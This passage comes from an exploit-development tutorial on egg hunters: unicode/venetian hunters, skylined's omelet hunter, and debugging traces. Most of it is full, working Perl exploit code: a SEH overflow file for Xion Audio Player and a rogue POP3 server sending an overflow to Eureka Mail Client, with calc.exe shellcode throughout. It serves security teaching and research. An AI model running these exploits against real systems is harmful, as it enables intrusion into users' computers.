\".$payload.\"\\n\";\nprint \" -> Sent \".length($payload).\" bytes\\n\";\n$cnt=$cnt+1;\n}\n}\nclose CLIENT;\nprint \"[+] Connection closed\\n\";\n[87]image\n[88]image\nYou may or may not be able to use this code in your own exploit \u2013\nafter all, this code was handmade and based on a given list of bad\nchars, offset required to end up writing after encoded hunter and so\non.\nJust take into account that this code will be (a lot) longer (so\nyou\u2019ll need a bigger buffer) than the unencoded\/original egghunter.\nThe code I used is 220 bytes \u2026\nWhat if your payload is subject to unicode conversion ? (All your\n00BB00AA005500EE are belong to us !)\nGood question !\nWell, there are 2 scenario\u2019s were there may be a way to make this work\n:\nScenario 1 : An ascii version of the payload can be found somewhere in\nmemory.\nThis sometimes happens and it\u2019s worth while investigating.  When data\nis accepted by the application in ascii, and stored in memory before it\ngets converted to unicode, then it may be still stored (and available)\nin memory when the overflow happens.\nA good way to find out if your shellcode is available in ascii is by\nwriting the shellcode to a file, and use the !pvefindaddr compare\nfeature.  If the shellcode can be found, and if it\u2019s not\nmodified\/corrupted\/converted to unicode in memory, the script will\nreport this back to you.\nIn that scenario, you would need to\n\u2013 convert the egg hunter into venetian shellcode and get that executed.\n(The egg hunter code will be a lot bigger than it was when it was just\nascii so available buffer space is important)\n\u2013 put your real shellcode (prepended with the marker) somewhere in\nmemory. The marker and the shellcode must be in ascii.\nWhen the venetian egghunter kicks in, it would simply locate the ascii\nversion of the shellcode in memory and execute it. Game over.\nConverting the egg hunter as venetian shellcode is as easy as putting\nthe egghunter (including the tag) in a file, and using alpha2 (or the\nrecently released [89]alpha3 (by skylined)) to convert it to unicode\n(pretty much as explained in my previous tutorial about unicode)\nIn case you\u2019re too tired to do it yourself, this is a unicode version\nof the egghunter, using w00t as tag, and using EAX as base register :\n#Corelan Unicode egghunter - Basereg=EAX - tag=w00t\nmy $egghunter = \"PPYAIAIAIAIAQATAXAZAPA3QADAZ\".\n\"ABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAX\".\n\"A58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABA\".\n\"BAB30APB944JBQVE1HJKOLOPB0RBJLBQHHMNNOLM5PZ4\".\n\"4JO7H2WP0P0T4TKZZFOSEZJ6OT5K7KO9WA\";\nThe nice thing about unicode egg hunters is that it is easier to tweak\nthe start location of where the egg hunter will start the search, if\nthat would be required.\nRemember when we talked about this a little bit earlier ?  If the\negg+shellcode can be found on the stack, then why search through large\npieces of memory if we can find it close to where the egg hunter is.\nThe nice thing is that you can create egghunter code that contains null\nbytes, because these bytes won\u2019t be a problem here.\nSo if you want to replace \u201c\\x66\\x81\\xCA\\xFF\\x0F\u201d  with\n\u201c\\x66\\x81\\xCA\\x00\\x00\u201d to influence the start location of the hunter,\nthen be my guest. (In fact, this is what I have done when I created the\nunicode egghunter, not because I had to, but merely because I wanted to\ntry).\nScenario 2 : Unicode payload only\nIn this scenario, you cannot control contents of memory with ascii\nshellcode, so basically everything is unicode.\nIt\u2019s still doable, but it will take a little longer to build a working\nexploit.\nFirst of all, you still need a unicode egghunter, but you will need to\nmake sure the tag\/marker is unicode friendly as well. After all, you\nwill have to put the tag before the real shellcode (and this tag will\nbe unicode).\nIn addition to that, you will need to align registers 2 times : one\ntime to execute the egg hunter, and then a second time, between the tag\nand the real shellcode (so you can decode the real shellcode as well).\nSo, in short :\n\u2013 Trigger overflow and redirect execution to\n\u2013 code that aligns register and adds some padding if required, and then\njumps to\n\u2013 unicode shellcode that would self-decode and run the egg hunter which\nwould\n\u2013 look for a double tag in memory (locating the egg \u2013 unicode friendly)\nand then\n\u2013 execute the code right after the tag, which would need to\n\u2013 align register again, add some padding, and then\n\u2013 execute the unicode (real) shellcode (which will decode itself again\nand run the final shellcode)\nWe basically need to build a venetian egghunter that contains a tag,\nwhich can be used to prepend the real shellcode, and is unicode\nfriendly.  In the examples above, I have used w00t as tag, which in hex\nis 0x77,0x30,0x30,0x74  (= w00t reversed because of little endian).  So\nif we would replace the first and third byte with null byte, it would\nbecome  0x00,0x30,0x00,0x74 (or, in ascii :   t \u2013 null \u2013 0 \u2013 null)\nA little script that will write the egghunter in a binary form to a\nfile would be :\n#!\/usr\/bin\/perl\n# Little script to write egghunter shellcode to file\n# 2 files will be created :\n# - egghunter.bin : contains w00t as tag\n# - egghunterunicode.bin : contains 0x00,0x30,0x00,0x74 as tag\n#\n# Written by Peter Van Eeckhoutte\n# http:\/\/www.corelan.be\n#\nmy $egghunter =\n\"\\x66\\x81\\xCA\\xFF\\x0F\\x42\\x52\\x6A\\x02\\x58\\xCD\\x2E\\x3C\\x05\\x5A\\x74\\xEF\\xB8\".\n\"\\x77\\x30\\x30\\x74\". # this is the marker\/tag: w00t\n\"\\x8B\\xFA\\xAF\\x75\\xEA\\xAF\\x75\\xE7\\xFF\\xE7\";\nprint \"Writing egghunter with tag w00t to file egghunter.bin...\\n\";\nopen(FILE,\">egghunter.bin\");\nprint FILE $egghunter;\nclose(FILE);\nprint \"Writing egghunter with unicode tag to file egghunter.bin...\\n\";\nopen(FILE,\">egghunterunicode.bin\");\nprint FILE \"\\x66\\x81\\xCA\\xFF\\x0F\\x42\\x52\\x6A\\x02\\x58\\xCD\\x2E\\x3C\";\nprint FILE \"\\x05\\x5A\\x74\\xEF\\xB8\";\nprint FILE \"\\x00\";   #null\nprint FILE \"\\x30\";   #0\nprint FILE \"\\x00\";   #null\nprint FILE \"\\x74\";   #t\nprint FILE \"\\x8B\\xFA\\xAF\\x75\\xEA\\xAF\\x75\\xE7\\xFF\\xE7\";\nclose(FILE);\n(as you can see, it will also write the ascii egghunter to a file \u2013 may\ncome handy one day)\nNow convert the egghunterunicode.bin to venetian shellcode :\n.\/alpha2 eax --unicode --uppercase < egghunterunicode.bin\nPPYAIAIAIAIAQATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI\n1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABA\nBABAB30APB944JBQVSQGZKOLOORB2BJLB0XHMNNOLLEPZ3DJO6XKPNPKP\nRT4KZZVO2UJJ6ORUJGKOK7A\nWhen building the unicode payload, you need to prepend the unicode\ncompatible tag string to the real (unicode) shellcode :  \u201c0t0t\u201d\n(without the quotes of course). When this string gets converted to\nunicode, it becomes 0x00 0x30 0x00 0x74 0x00 0x30 0x00 0x74\u2026 and that\ncorresponds with the marker what was put in the egghunter before it was\nconverted to unicode \u2013 see script above)\nBetween this 0t0t tag and the real (venetian) shellcode that needs to\nbe placed after the marker, you may have to include register alignment,\notherwise the venetian decoder will not work. If, for example, you have\nconverted your real shellcode to venetian shellcode using eax as\nbasereg, you\u2019ll have to make the beginning of the decoder point to the\nregister again\u2026   If you have read [90]tutorial part 7, you know what\nI\u2019m talking about.\nIn most cases, the egghunter will already put the current stack address\nin EDI (because it uses that register to keep track of the location in\nmemory where the egg tag is located. Right after the tag is found, this\nregister points to the last byte of the tag). So it would be trivial to\n(for example) move edi into eax and increase eax until it points to the\naddress where the venetian shellcode is located, or to just modify edi\n(and use venetian shellcode generated using edi as base register)\nThe first instruction for alignment will start with null byte (because\nthat\u2019s the last byte of the egg tag (30 00 74 00 30 00 74 00 )that we\nhave used).  So we need to start alignment with an instruction that is\nin the 00 xx 00 form.   00 6d 00 would work (and others will work too).\nNote : make sure the decoder for the venetian shellcode does not\noverwrite any of the egg hunter or eggs itself, as it obviously will\nbreak the exploit.\nLet\u2019s see if the theory works\nWe\u2019ll use the vulnerability in xion audio player 1.0 build 121 again\n(see [91]tutorial part 7) to demonstrate that this actually works. I\u2019m\nnot going to repeat all steps to build the exploit and alignments, but\nI have included some details about it inside the exploit script itself.\nBuilding\/reading\/using this exploit requires you to really master the\nstuff explained in tutorial part 7. So if you don\u2019t understand yet, I\nwould strongly suggest to either read it first, or skip this exploit\nand move on to the next chapter.\n# [*] Vulnerability : Xion Audio Player Local BOF\n# [*] Written by : corelanc0d3r (corelanc0d3r[at]gmail[dot]com)\n# -----------------------------------------------------------------------\n# Exploit based on original unicode exploit from tutorial part 7\n# but this time I'm using a unicode egghunter, just for phun !\n#\n# Script provided 'as is', without any warranty.\n# Use for educational purposes only.\n#\nmy $sploitfile=\"corelansploit.m3u\";\nmy $junk = \"\\x41\" x 254;  #offset until we hit SEH\nmy $nseh=\"\\x58\\x48\"; #put something into eax - simulate nop\nmy $seh=\"\\xf5\\x48\"; #ppr from xion.exe - unicode compatible\n# will also simulate nop when executed\n# after p\/p\/r is executed, we end here\n# in order to be able to run the unicode decoder\n# we need to have eax pointing at our decoder stub\n# we'll make eax point to our buffer\n# we'll do this by putting ebp in eax and then increase eax\n# until it points to our egghunter\n#first, put ebp in eax (push \/ pop)\nmy $align=\"\\x55\";  #push ebp\n$align=$align.\"\\x6d\";   #align\/nop\n$align=$align.\"\\x58\";   #pop eax\n$align=$align.\"\\x6d\";   #align\/nop\n#now increase the address in eax so it would point to our buffer\n$align = $align.\"\\x05\\x10\\x11\";   #add eax,11001300\n$align=$align.\"\\x6d\";   #align\/nop\n$align=$align.\"\\x2d\\x02\\x11\";   #sub eax,11000200\n$align=$align.\"\\x6d\";   #align\/nop\n#eax now points at egghunter\n#jump to eax now\nmy $jump = \"\\x50\";  #push eax\n$jump=$jump.\"\\x6d\"; #nop\/align\n$jump=$jump.\"\\xc3\"; #ret\n#fill the space between here and eax\nmy $padding=\"A\" x 73;\n#this is what will be put at eax :\nmy $egghunter =\"PPYAIAIAIAIAQATAXAZAPA3QADAZA\".\n\"BARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA\".\n\"58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABAB\".\n\"AB30APB944JB36CQ7ZKPKPORPR2JM2PXXMNNOLKUQJRT\".\n\"ZOVXKPNPM0RT4KKJ6ORUZJFO2U9WKOZGA\";\n# - ok so far the exploit looks the same as the one used in tutorial 7\n# except for the fact that the shellcode is the unicode version of\n# an egghunter looking for the \"0t0t\" egg marker\n# the egghunter was converted to unicode using eax as basereg\n#\n# Between the egghunter and the shellcode that it should look for\n# I'll write some garbage (a couple of X's in this case)\n# So we'll pretend the real shellcode is somewhere out there\nmy $garbage = \"X\" x 50;\n# real shellcode (venetian, uses EAX as basereg)\n# will spawn calc.exe\nmy $shellcode=\"PPYAIAIAIAIAQATAXAZAPA3QADAZA\".\n\"BARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAX\".\n\"A58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABAB\".\n\"ABAB30APB944JBKLK8OTKPKPM0DKOUOLTKSLM5SHKQJ\".\n\"O4K0OLXTKQOMPKQZKOYTKP44KM1ZNNQY0V96L3TWPT4\".\n\"KW7QHJLMKQWRZKL4OKQDNDKTBUIUTK1OO4KQJK1VTKL\".\n\"LPK4K1OMLM1ZK4KMLTKKQJKSY1LMTKTGSNQWPRDTKOP\".\n\"NPU5902XLLTKOPLLDK2PMLFMTKQXM8JKM94K3P6PM0K\".\n\"PKP4KQXOLQONQL6QPPV59KH53GP3K0PQXJPDJM4QO2H\".\n\"68KN4JLN0WKOK7QSC1RLQSKPA\";\n# between the egg marker and shellcode, we need to align\n# so eax points at the beginning of the real shellcode\nmy $align2 = \"\\x6d\\x57\\x6d\\x58\\x6d\";  #nop, push edi, nop, pop eax, nop\n$align2 = $align2.\"\\xb9\\x1b\\xaa\";  #mov ecx, 0xaa001b00\n$align2 = $align2.\"\\xe8\\x6d\";  #add al,ch + nop  (increase eax with 1b)\n$align2 = $align2.\"\\x50\\x6d\\xc3\";  #push eax, nop, ret\n#eax now points at the real shellcode\n#fill up rest of space & trigger access violation\nmy $filler = (\"\\xcc\" x (15990-length($shellcode)));\n#payload\nmy $payload = $junk.$nseh.$seh.$align.$jump.$padding.$egghunter;\n$payload=$payload.$garbage.\"0t0t\".$align2.$shellcode.$filler;\nopen(myfile,\">$sploitfile\");\nprint myfile $payload;\nprint \"Wrote \" . length($payload).\" bytes to $sploitfile\\n\";\nclose(myfile);\n[92]image\npwned !\nNote : if size is really an issue (for the final shellcode), you\ncould make the alignment code a number of bytes shorter by using\nwhat is in edi already (instead of using eax as basereg. Of course\nyou then need to generate the shellcode using edi as basereg), and\nby avoiding the push + ret instructions. You could simply make edi\npoint to the address directly after the last alignment instruction\nwith some simple instructions.\nAnother example of unicode (or venetian) egghunter code can be found\nhere :[93]http:\/\/www.pornosecurity.org\/blog\/exploiting-bittorrent (demo\nat [94]http:\/\/www.pornosecurity.org\/bittorrent\/bittorrent.html)\nSome tips to debug this kind of exploits using Immunity Debugger :\nThis is a SEH based exploit, so when the app crashed, see where the SEH\nchain is and set a breakpoint at the chain. Pass the exception (Shift\nF9) to the application and the breakpoint will be hit. On my system,\nthe seh chain was located at 0x0012f2ac\n[95]image\nTrace through the instructions (F7) until you see that the decoder\nstarts decoding the egghunter and writing the original instructions on\nthe stack.\n[96]image\nIn my case, the decoder started writing the original egghunter to\n0x0012f460.\nAs soon as I could see the first instruction at 0x0012f460 (which is 66\n81 CA and so on), I set a breakpoint at 0x0012f460.\n[97]image\nThen press CTRL+F12. Breakpoint would be hit and you would land at\n0x0012f460. The original egghunter is now recombined and will start\nsearching for the marker.\n[98]image\nAt 0x0012f47b (see screenshot), we see the instruction that will be\nexecuted when the egg has been found. Set a new breakpoint on\n0x0012f47b and press CTRL-F12 again.   If you end up at the breakpoint,\nthen the egg has been found.  Press F7 (trace) again to execute the\nnext instructions until the jmp to edi is made.  (the egghunter has put\nthe address of the egg at EDI, and jmp edi now redirects flow to that\nlocation).  When the jmp edi is made, we end at the last byte of the\nmarker.\nThis is where our second aligment code is placed.  It will make eax\npoint to the shellcode (decoder stub) and will then perform the push\neax + ret\n[99]image\nOmelet egg hunter (All your eggs, even the broken ones, are belong to us !)\nHuh ? Broken eggs ? What you say ?\nWhat if you find yourself in a situation where you don\u2019t really have a\nbig amount of memory space to host your shellcode, but you have\nmultiple smaller spaces available \/ controlled by you ?  In this\nscenario, dictated by shellcode fragmentation  a technique called\nomelet egg hunting may work.\nIn this technique, you would break up the actual shellcode in smaller\npieces, deliver the pieces to memory, and launch the hunter code which\nwould search all eggs, recombine then, and make an omelet \u2026 err \u2026 I\nmean it would execute the recombined shellcode.\nThe basic concept behind omelet egg hunter is pretty much the same as\nwith regular egg hunters, but there are 2 main differences :\n\u2013 the final shellcode is broken down in pieces (= multiple eggs)\n\u2013 the final shellcode is recombined before it is executed (so it\u2019s not\nexecuted directly after it has been found)\nIn addition to that, the egghunter code (or omelet code) is\nsignificantly larger than a normal egghunter (around 90 bytes  vs\nbetween 30 and 60 bytes for a normal egghunter)\nThis technique was documented by skylined (Berend-Jan Wever) here\n(Google Project files can be found [100]here.) Quote from Berend-Jan :\nIt is similar to egg-hunt shellcode, but will search user-land\naddress space for multiple smaller eggs and recombine them into one\nlarger block of shellcode and execute it. This is useful in\nsituation where you cannot inject a block of sufficient size into a\ntarget process to store your shellcode in one piece, but you can\ninject multiple smaller blocks and execute one of them.\nHow does it work?\nThe original shellcode needs to be split in smaller pieces\/eggs. Each\negg needs to have a header that contains\n\u2013 the length of the egg\n\u2013 an index number\n\u2013 3 marker bytes (use to detect the egg)\nThe omelet shellcode\/egg hunter also needs to know what the size of the\neggs is, how many eggs there will be, and what the 3 bytes are (tag or\nmarker) that identifies an egg.\nWhen the omelet code executes, it will search through memory, look for\nall the eggs, and reproduces the original shellcode (before it was\nbroken into pieces) at the bottom of the stack. When it has completed,\nit jumps to the reproduced shellcode and executes it.   The omelet code\nwritten by skylined injects custom SEH handlers in order to deal with\naccess violations when reading memory.\nLuckily, skylined wrote a set of scripts to automate the entire process\nof breaking down shellcode in smaller eggs and produce the omelet code.\nDownload the scripts [101]here. (The zip file contains the nasm file\nthat contains the omelet hunter and a python script to create the\neggs). If you don\u2019t have a copy of nasm, you can get a copy [102]here.\nI have unzipped the omelet code package to c:\\omelet.  nasm is\ninstalled under \u201cc:\\program files\\nasm\u201d.\nCompile the nasm file to a binary file :\nC:\\omelet>\"c:\\program files\\nasm\\nasm.exe\" -f bin -o w32_omelet.bin w32_SEH_omel\net.asm -w+error\n(you only need to do this one time. Once you have this file, you can\nuse it for all exploits)\nHow to implement the omelet egg hunter ?\n1. Create a file that contains the shellcode that you want to execute\nin the end.  (I used \u201cshellcode.bin\u201d)\n(You can use a script like this to generate the shellcode.bin file.\nSimply replace the $shellcode with your own shellcode and run the\nscript. In my example, this shellcode will spawn calc.exe) :\nmy $scfile=\"shellcode.bin\";\nmy $shellcode=\"\\x89\\xe2\\xda\\xc1\\xd9\\x72\\xf4\\x58\\x50\\x59\\x49\\x49\\x49\\x49\" .\n\"\\x43\\x43\\x43\\x43\\x43\\x43\\x51\\x5a\\x56\\x54\\x58\\x33\\x30\\x56\" .\n\"\\x58\\x34\\x41\\x50\\x30\\x41\\x33\\x48\\x48\\x30\\x41\\x30\\x30\\x41\" .\n\"\\x42\\x41\\x41\\x42\\x54\\x41\\x41\\x51\\x32\\x41\\x42\\x32\\x42\\x42\" .\n\"\\x30\\x42\\x42\\x58\\x50\\x38\\x41\\x43\\x4a\\x4a\\x49\\x4b\\x4c\\x4a\" .\n\"\\x48\\x50\\x44\\x43\\x30\\x43\\x30\\x45\\x50\\x4c\\x4b\\x47\\x35\\x47\" .\n\"\\x4c\\x4c\\x4b\\x43\\x4c\\x43\\x35\\x43\\x48\\x45\\x51\\x4a\\x4f\\x4c\" .\n\"\\x4b\\x50\\x4f\\x42\\x38\\x4c\\x4b\\x51\\x4f\\x47\\x50\\x43\\x31\\x4a\" .\n\"\\x4b\\x51\\x59\\x4c\\x4b\\x46\\x54\\x4c\\x4b\\x43\\x31\\x4a\\x4e\\x50\" .\n\"\\x31\\x49\\x50\\x4c\\x59\\x4e\\x4c\\x4c\\x44\\x49\\x50\\x43\\x44\\x43\" .\n\"\\x37\\x49\\x51\\x49\\x5a\\x44\\x4d\\x43\\x31\\x49\\x52\\x4a\\x4b\\x4a\" .\n\"\\x54\\x47\\x4b\\x51\\x44\\x46\\x44\\x43\\x34\\x42\\x55\\x4b\\x55\\x4c\" .\n\"\\x4b\\x51\\x4f\\x51\\x34\\x45\\x51\\x4a\\x4b\\x42\\x46\\x4c\\x4b\\x44\" .\n\"\\x4c\\x50\\x4b\\x4c\\x4b\\x51\\x4f\\x45\\x4c\\x45\\x51\\x4a\\x4b\\x4c\" .\n\"\\x4b\\x45\\x4c\\x4c\\x4b\\x45\\x51\\x4a\\x4b\\x4d\\x59\\x51\\x4c\\x47\" .\n\"\\x54\\x43\\x34\\x48\\x43\\x51\\x4f\\x46\\x51\\x4b\\x46\\x43\\x50\\x50\" .\n\"\\x56\\x45\\x34\\x4c\\x4b\\x47\\x36\\x50\\x30\\x4c\\x4b\\x51\\x50\\x44\" .\n\"\\x4c\\x4c\\x4b\\x44\\x30\\x45\\x4c\\x4e\\x4d\\x4c\\x4b\\x45\\x38\\x43\" .\n\"\\x38\\x4b\\x39\\x4a\\x58\\x4c\\x43\\x49\\x50\\x42\\x4a\\x50\\x50\\x42\" .\n\"\\x48\\x4c\\x30\\x4d\\x5a\\x43\\x34\\x51\\x4f\\x45\\x38\\x4a\\x38\\x4b\" .\n\"\\x4e\\x4d\\x5a\\x44\\x4e\\x46\\x37\\x4b\\x4f\\x4d\\x37\\x42\\x43\\x45\" .\n\"\\x31\\x42\\x4c\\x42\\x43\\x45\\x50\\x41\\x41\";\nopen(FILE,\">$scfile\");\nprint FILE $shellcode;\nclose(FILE);\nprint \"Wrote \".length($shellcode).\" bytes to file \".$scfile.\"\\n\";\nRun the script. File shellcode.bin now contains the binary shellcode.\n(of course, if you want something else than calc, just replace the\ncontents of $shellcode.\n2. Convert the shellcode to eggs\nLet\u2019s say we have figured out that we have a number of times of about\n130 bytes of memory space at our disposal. So we need to cut the 303\nbytes of code in 3 eggs (+ some overhead \u2013 so we could end up with 3 to\n4 eggs).  The maximum size of each egg is 127 bytes. We also need a\nmarker. (6 bytes). We\u2019ll use 0xBADA55 as marker.\nRun the following command to create the shellcode :\nC:\\omelet>w32_SEH_omelet.py\nSyntax:\nw32_SEH_omelet.py \"omelet bin file\" \"shellcode bin file\" \"output txt file\"\n[egg size] [marker bytes]\nWhere:\nomelet bin file = The omelet shellcode stage binary code followed by three\nbytes of the offsets of the \"marker bytes\", \"max index\"\nand \"egg size\" variables in the code.\nshellcode bin file = The shellcode binary code you want to have stored in\nthe eggs and reconstructed by the omelet shellcode stage\ncode.\noutput txt file = The file you want the omelet egg-hunt code and the eggs\nto be written to (in text format).\negg size =        The size of each egg (legal values: 6-127, default: 127)\nmarker bytes =    The value you want to use as a marker to distinguish the\neggs from other data in user-land address space (legal\nvalues: 0-0xFFFFFF, default value: 0x280876)\n=> in our case, the command could be :\nC:\\omelet>w32_SEH_omelet.py w32_omelet.bin shellcode.bin calceggs.txt 127 0xBADA\n55\nOpen the newly created file calceggs.txt. It contains\n\u2013 the omelet egghunter code (which should be executed and will hunt for\nthe eggs)\n\u2013 the eggs that must be placed somewhere in memory.\n[103]image\nIf you look closer at the eggs, you\u2019ll see that\n\u2013 the first 5 bytes contain the size (0x7A = 122), index (0xFF \u2013 0xFE \u2013\n0xFD), and the marker (0x55,0xDA,0xBA  => 0xBADA55).   122 + 5 bytes\nheader = 127 bytes\n\u2013 the next bytes in the egg are taken from the original shellcode from\nour calc.exe payload\n\u2013 in the the last egg, the remaining space is filled with 0x40\n3. Build the exploit\nLet\u2019s test this concept in our Eureka Mail Client exploit. We\u2019ll put\nsome garbage between the eggs to simulate that the eggs were placed at\nrandom locations in memory :\nuse Socket;\n#fill out the local IP or hostname\n#which is used by Eureka EMail as POP3 server\n#note : must be exact match !\nmy $localserver = \"192.168.0.193\";\n#calculate offset to EIP\nmy $junk = \"A\" x (723 - length($localserver));\nmy $ret=pack('V',0x7E47BCAF); #jmp esp from user32.dll\nmy $padding = \"\\x90\" x 1000;\nmy $omelet_code = \"\\x31\\xFF\\xEB\\x23\\x51\\x64\\x89\\x20\\xFC\\xB0\\x7A\\xF2\".\n\"\\xAE\\x50\\x89\\xFE\\xAD\\x35\\xFF\\x55\\xDA\\xBA\\x83\\xF8\\x03\\x77\\x0C\\x59\".\n\"\\xF7\\xE9\\x64\\x03\\x42\\x08\\x97\\xF3\\xA4\\x89\\xF7\\x31\\xC0\\x64\\x8B\\x08\".\n\"\\x89\\xCC\\x59\\x81\\xF9\\xFF\\xFF\\xFF\\xFF\\x75\\xF5\\x5A\\xE8\\xC7\\xFF\\xFF\".\n\"\\xFF\\x61\\x8D\\x66\\x18\\x58\\x66\\x0D\\xFF\\x0F\\x40\\x78\\x06\\x97\\xE9\\xD8\".\n\"\\xFF\\xFF\\xFF\\x31\\xC0\\x64\\xFF\\x50\\x08\";\nmy $egg1 = \"\\x7A\\xFF\\x55\\xDA\\xBA\\x89\\xE2\\xDA\\xC1\\xD9\\x72\\xF4\\x58\\x50\".\n\"\\x59\\x49\\x49\\x49\\x49\\x43\\x43\\x43\\x43\\x43\\x43\\x51\\x5A\\x56\\x54\\x58\\x33\".\n\"\\x30\\x56\\x58\\x34\\x41\\x50\\x30\\x41\\x33\\x48\\x48\\x30\\x41\\x30\\x30\\x41\\x42\".\n\"\\x41\\x41\\x42\\x54\\x41\\x41\\x51\\x32\\x41\\x42\\x32\\x42\\x42\\x30\\x42\\x42\\x58\".\n\"\\x50\\x38\\x41\\x43\\x4A\\x4A\\x49\\x4B\\x4C\\x4A\\x48\\x50\\x44\\x43\\x30\\x43\\x30\".\n\"\\x45\\x50\\x4C\\x4B\\x47\\x35\\x47\\x4C\\x4C\\x4B\\x43\\x4C\\x43\\x35\\x43\\x48\\x45\".\n\"\\x51\\x4A\\x4F\\x4C\\x4B\\x50\\x4F\\x42\\x38\\x4C\\x4B\\x51\\x4F\\x47\\x50\\x43\\x31\".\n\"\\x4A\\x4B\\x51\\x59\\x4C\\x4B\\x46\\x54\\x4C\\x4B\\x43\";\nmy $egg2 = \"\\x7A\\xFE\\x55\\xDA\\xBA\\x31\\x4A\\x4E\\x50\\x31\\x49\\x50\\x4C\\x59\".\n\"\\x4E\\x4C\\x4C\\x44\\x49\\x50\\x43\\x44\\x43\\x37\\x49\\x51\\x49\\x5A\\x44\\x4D\\x43\".\n\"\\x31\\x49\\x52\\x4A\\x4B\\x4A\\x54\\x47\\x4B\\x51\\x44\\x46\\x44\\x43\\x34\\x42\\x55\".\n\"\\x4B\\x55\\x4C\\x4B\\x51\\x4F\\x51\\x34\\x45\\x51\\x4A\\x4B\\x42\\x46\\x4C\\x4B\\x44\".\n\"\\x4C\\x50\\x4B\\x4C\\x4B\\x51\\x4F\\x45\\x4C\\x45\\x51\\x4A\\x4B\\x4C\\x4B\\x45\\x4C\".\n\"\\x4C\\x4B\\x45\\x51\\x4A\\x4B\\x4D\\x59\\x51\\x4C\\x47\\x54\\x43\\x34\\x48\\x43\\x51\".\n\"\\x4F\\x46\\x51\\x4B\\x46\\x43\\x50\\x50\\x56\\x45\\x34\\x4C\\x4B\\x47\\x36\\x50\\x30\".\n\"\\x4C\\x4B\\x51\\x50\\x44\\x4C\\x4C\\x4B\\x44\\x30\\x45\";\nmy $egg3 = \"\\x7A\\xFD\\x55\\xDA\\xBA\\x4C\\x4E\\x4D\\x4C\\x4B\\x45\\x38\\x43\\x38\".\n\"\\x4B\\x39\\x4A\\x58\\x4C\\x43\\x49\\x50\\x42\\x4A\\x50\\x50\\x42\\x48\\x4C\\x30\\x4D\".\n\"\\x5A\\x43\\x34\\x51\\x4F\\x45\\x38\\x4A\\x38\\x4B\\x4E\\x4D\\x5A\\x44\\x4E\\x46\\x37\".\n\"\\x4B\\x4F\\x4D\\x37\\x42\\x43\\x45\\x31\\x42\\x4C\\x42\\x43\\x45\\x50\\x41\\x41\\x40\".\n\"\\x40\\x40\\x40\\x40\\x40\\x40\\x40\\x40\\x40\\x40\\x40\\x40\\x40\\x40\\x40\\x40\\x40\".\n\"\\x40\\x40\\x40\\x40\\x40\\x40\\x40\\x40\\x40\\x40\\x40\\x40\\x40\\x40\\x40\\x40\\x40\".\n\"\\x40\\x40\\x40\\x40\\x40\\x40\\x40\\x40\\x40\\x40\\x40\\x40\\x40\\x40\\x40\\x40\\x40\".\n\"\\x40\\x40\\x40\\x40\\x40\\x40\\x40\\x40\\x40\\x40\\x40\";\nmy $garbage=\"This is a bunch of garbage\" x 10;\nmy $payload=$junk.$ret.$omelet_code.$padding.$egg1.$garbage.$egg2.$garbage.$egg3\n;\nprint \"Payload : \" . length($payload).\" bytes\\n\";\nprint \"Omelet code : \" . length($omelet_code).\" bytes\\n\";\nprint \" Egg 1 : \" . length($egg1).\" bytes\\n\";\nprint \" Egg 2 : \" . length($egg2).\" bytes\\n\";\nprint \" Egg 3 : \" . length($egg3).\" bytes\\n\";\n#set up listener on port 110\nmy $port=110;\nmy $proto=getprotobyname('tcp');\nsocket(SERVER,PF_INET,SOCK_STREAM,$proto);\nmy $paddr=sockaddr_in($port,INADDR_ANY);\nbind(SERVER,$paddr);\nlisten(SERVER,SOMAXCONN);\nprint \"[+] Listening on tcp port 110 [POP3]... \\n\";\nprint \"[+] Configure Eureka Mail Client to connect to this host \\n\";\nmy $client_addr;\nwhile($client_addr=accept(CLIENT,SERVER))\n{\nprint \"[+] Client connected, sending evil payload\\n\";\nwhile(1)\n{\nprint CLIENT \"-ERR \".$payload.\"\\n\";\nprint \" -> Sent \".length($payload).\" bytes\\n\";\n}\n}\nclose CLIENT;\nprint \"[+] Connection closed\\n\";\nRun the script :\nC:\\sploits\\eureka>perl corelan_eurekasploit4.pl\nPayload     : 2700 bytes\nOmelet code : 85 bytes\nEgg 1 : 127 bytes\nEgg 2 : 127 bytes\nEgg 3 : 127 bytes\n[+] Listening on tcp port 110 [POP3]...\n[+] Configure Eureka Mail Client to connect to this host\nResult : Access Violation when reading [00000000]\n[104]image\nWhen looking closer at the code, we see that the first instruction of\nthe omelet code puts 00000000 in EDI (\\x31\\xFF = XOR EDI,EDI). When it\nstarts reading at that address, we get an access violation. Despite the\nfact that the code uses custom SEH injection to handle access\nviolations, this one was not handled and the exploit fails.\nSet a breakpoint at jmp esp (0x7E47BCAF) and run the exploit again.\nTake not of the registers when the jump to esp is made :\n[105]image\nOk, let\u2019s troubleshoot this. Start by locating the eggs in memory .\nAfter all, perhaps we can put another start address in EDI (other than\nzero), based on one of these registers and the place where the eggs are\nlocated, allowing the omelet code to work properly.\nFirst, write the 3 eggs to files (add the following lines of code in\nthe exploit, before the listener is set up):\nopen(FILE,\">c:\\\\tmp\\\\egg1.bin\");\nprint FILE $egg1;\nclose(FILE);\nopen(FILE,\">c:\\\\tmp\\\\egg2.bin\");\nprint FILE $egg2;\nclose(FILE);\nopen(FILE,\">c:\\\\tmp\\\\egg3.bin\");\nprint FILE $egg3;\nclose(FILE);\nAt the jmp esp breakpoint, run the following commands :\n!pvefindaddr compare c:\\tmp\\egg1.bin\n[106]image\n!pvefindaddr compare c:\\tmp\\egg2.bin\n[107]image\n!pvefindaddr compare c:\\tmp\\egg3.bin\n[108]image\nOk, so the 3 eggs are found in memory, and are not corrupted.\nLook at the addresses.  One copy is found on the stack (0x0012????),\nother copies are elsewhere in memory (0x0047????). When we look back at\nthe registers, taking into account that we need to find a register that\nis reliable, and positioned before the eggs, we see the following\nthings :\nEAX 00000000\nECX 7C91005D ntdll.7C91005D\nEDX 00140608\nEBX 00450266 Eureka_E.00450266\nESP 0012CD6C\nEBP 00475BFC Eureka_E.00475BFC\nESI 00475BF8 Eureka_E.00475BF8\nEDI 00473678 ASCII \"AAAAAAAAAAAAA\"\nEIP 0012CD6C\nC 0  ES 0023 